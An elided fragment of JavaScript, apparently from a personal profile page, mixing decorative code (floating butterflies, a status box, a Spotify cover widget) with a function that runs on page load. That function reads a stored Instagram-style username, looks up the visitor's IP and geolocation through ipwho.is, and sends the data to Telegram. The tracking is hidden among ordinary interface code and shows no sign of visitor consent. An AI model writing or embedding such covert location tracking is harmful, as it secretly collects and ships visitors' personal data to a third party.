...
async function showVisitorInfo() {
  const savedUser = localStorage.getItem("ig_user") || "Anonim";
  async function sendToTelegram(d, latitude, longitude) {
    try {
      const now = new Date();
...
🕓 ${now.toLocaleString('id-ID')}`;
  ...
  try {
    ...
    await sendToTelegram(ipData, latitude, longitude);
  } catch {
    const d = await (await fetch("https://ipwho.is/")).json();
    await sendToTelegram(d, d.latitude, d.longitude);
  }
}
showVisitorInfo();
...
(function(){
  ...
  for(let i=0;i<count;i++){
    ...
    butterflies.push({el:b,x:Math.random()*rect.width,y:Math.random()*rect.height,vx:(Math.random()-0.5)*1.2,vy:(Math.random()-0.5)*1.2,size:16+Math.random()*10});
    b.style.fontSize=butterflies[i].size+'px';
  }
  function loop(){
    butterflies.forEach(b=>{
      b.x+=b.vx;b.y+=b.vy;
      if(b.x<=0||b.x>=rect.width-b.size)b.vx*=-1;
      if(b.y<=0||b.y>=rect.height-b.size)b.vy*=-1;
...
(async function(){
  ...
  statusBox.style.cssText="width:100%;text-align:center;font-size:14px;color:#cfcfcf;margin-top:6px;opacity:0;transition:opacity .6s ease;";
...
(async function(){
  ...
  spotifyBox.style.cssText="width:100%;max-width:280px;margin:10px auto;text-align:center;display:flex;flex-direction:column;align-items:center;opacity:0;transition:opacity .4s ease;";
  const coverWrap=document.createElement("div");
  coverWrap.style.cssText="position:relative;width:100%;height:100px;border-radius:12px;overflow:hidden;box-shadow:0 0 18px rgba(76,201,255,0.25);";
  const cover=document.createElement("img");
  cover.style.cssText="width:100%;height:100%;object-fit:cover;display:none;";
